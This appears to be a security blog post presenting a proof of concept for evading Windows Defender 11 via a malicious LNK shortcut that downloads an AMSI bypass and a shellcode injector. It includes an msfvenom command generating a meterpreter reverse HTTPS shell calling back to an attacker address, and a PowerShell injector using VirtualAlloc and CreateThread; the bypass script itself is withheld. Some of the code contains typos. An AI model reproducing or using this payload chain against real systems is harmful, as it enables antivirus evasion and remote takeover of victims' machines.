## Table of Contents

- [**Outline**](#section-0)
- [**Windows Defender  Explanation**](#section-1)
- [**LNK Files**](#section-2)
- [ **Proof of Concept - Bypassing 2023 Windows Defender 11**](#section-3)




## Outline  {#section-0}

The objective of this document is to explore evasion techniques concerning the latest security measures implemented within Windows Defender 11. Upon clicking on the seemingly benign Notepad looking file, the lnk file downloads both obfuscated AMSI bypass script alongside a shell code process injector script. This effectivly disables Windows Defender and the attacker gains an interactive meterpreter shell.

![](/assets/AV/Final.png)  

# Windows Defender   {#section-1}
Windows Defender 11 is Microsoft's built-in antivirus and antimalware solution. It provides real-time protection against various threats like viruses, ransomware, spyware, and other malicious software. Defender scans files, monitors activities, and offers firewall protection, all to help safeguard your system and data from potential security risks. Additionally, it includes features such as cloud-based protection and regular updates to ensure comprehensive defense against evolving threats.

# LNK Exploitation{#section-2}

An LNK file, short for Shell Link Binary File, is a file type associated with Windows shortcuts. LNK files typically serve as pointers to executable files or applications, allowing users to quickly access programs or documents. However, in a malicious context, an LNK file can be crafted to download and execute a Defender bypass script along with a shell code injector. This technique is employed in cyberattacks to evade detection by security tools and gain unauthorized access or control over a target system. Similar to Word document macros, the malicious LNK file exploits the execution capabilities of its associated application to carry out unauthorized actions on the compromised system.

# LNK Expolitation Proof of Concept {#section-3}
<img src="/assets/AV/LNK.gif" width="1500" height="2500"/>
Create a meterpreter shell to be injected.

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.20.131 LPORT=443 EXITFUNC=process -f ps1
```
Prepare a shell code injector payload to paste the generated shell code

```bash
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static exter IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStckSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

[Byte[]] $buf = <Shell Code Here>


$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")

```
Encoding the powershell with base64.

Prepare a Bypass Script and conduct obfuscation. This step is hidden for potential abuse cases

Create a LNK shortcut file that downlaods both the bypass script and shell code injector.



